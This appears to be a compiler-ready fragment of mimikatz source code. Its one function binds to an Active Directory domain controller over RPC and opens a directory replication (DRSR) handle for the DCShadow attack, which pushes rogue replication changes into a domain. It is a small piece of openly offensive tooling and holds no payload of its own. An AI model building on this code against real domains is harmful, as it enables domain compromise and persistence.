
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_11__ TYPE_4__ ;
typedef struct TYPE_10__ TYPE_2__ ;
typedef struct TYPE_9__ TYPE_1__ ;


typedef int (* kuhl_m_lsadump_dcshadow_bind_DRSR_function ) (TYPE_2__*,int *) ;
typedef int ULONG ;
struct TYPE_11__ {int cb; int dwFlags; int dwReplEpoch; } ;
struct TYPE_9__ {int InvocationId; } ;
struct TYPE_10__ {TYPE_1__ realDc; int dwReplEpoch; int szDCFQDN; } ;
typedef int RPC_BINDING_HANDLE ;
typedef TYPE_2__* PDCSHADOW_DOMAIN_INFO ;
typedef int NTSTATUS ;
typedef int DWORD ;
typedef int * DRS_HANDLE ;
typedef TYPE_4__ DRS_EXTENSIONS_INT ;


 int DRS_EXT_GETCHGREPLY_V6 ;
 int DRS_EXT_STRONG_ENCRYPTION ;
 int IDL_DRSUnbind (int **) ;
 int MIMIKATZ_NT_MAJOR_VERSION ;
 int PRINT_ERROR (char*) ;
 int RPC_C_AUTHN_GSS_KERBEROS ;
 int RPC_C_AUTHN_GSS_NEGOTIATE ;
 int RPC_C_IMP_LEVEL_DEFAULT ;
 int RtlZeroMemory (TYPE_4__*,int) ;
 int STATUS_UNSUCCESSFUL ;
 int TRUE ;
 scalar_t__ kull_m_rpc_createBinding (int *,char*,int ,int *,char*,int ,int ,int *,int ,int *,int ) ;
 int kull_m_rpc_deleteBinding (int *) ;
 int kull_m_rpc_drsr_RpcSecurityCallback ;
 scalar_t__ kull_m_rpc_drsr_getDCBind (int *,int *,int **,TYPE_4__*) ;

ULONG kuhl_m_lsadump_dcshadow_bind_DRSR(PDCSHADOW_DOMAIN_INFO info, kuhl_m_lsadump_dcshadow_bind_DRSR_function function)
{
 NTSTATUS status = STATUS_UNSUCCESSFUL;
 RPC_BINDING_HANDLE hBinding;
 DRS_HANDLE hDrs = ((void*)0);
 DRS_EXTENSIONS_INT DrsExtensionsInt;

 if(kull_m_rpc_createBinding(((void*)0), L"ncacn_ip_tcp", info->szDCFQDN, ((void*)0), L"ldap", TRUE, (MIMIKATZ_NT_MAJOR_VERSION < 6) ? RPC_C_AUTHN_GSS_KERBEROS : RPC_C_AUTHN_GSS_NEGOTIATE, ((void*)0), RPC_C_IMP_LEVEL_DEFAULT, &hBinding, kull_m_rpc_drsr_RpcSecurityCallback))
 {
  RtlZeroMemory(&DrsExtensionsInt, sizeof(DRS_EXTENSIONS_INT));
  DrsExtensionsInt.cb = sizeof(DRS_EXTENSIONS_INT) - sizeof(DWORD);
  DrsExtensionsInt.dwFlags = DRS_EXT_GETCHGREPLY_V6 | DRS_EXT_STRONG_ENCRYPTION;
  DrsExtensionsInt.dwReplEpoch = info->dwReplEpoch;
  if(kull_m_rpc_drsr_getDCBind(&hBinding, &(info->realDc.InvocationId), &hDrs, &DrsExtensionsInt))
  {
   status = function(info, hDrs);
   IDL_DRSUnbind(&hDrs);
  }
  kull_m_rpc_deleteBinding(&hBinding);
 }
 else PRINT_ERROR(L"Domain not present, or doesn\'t look like a FQDN\n");
 return status;
}
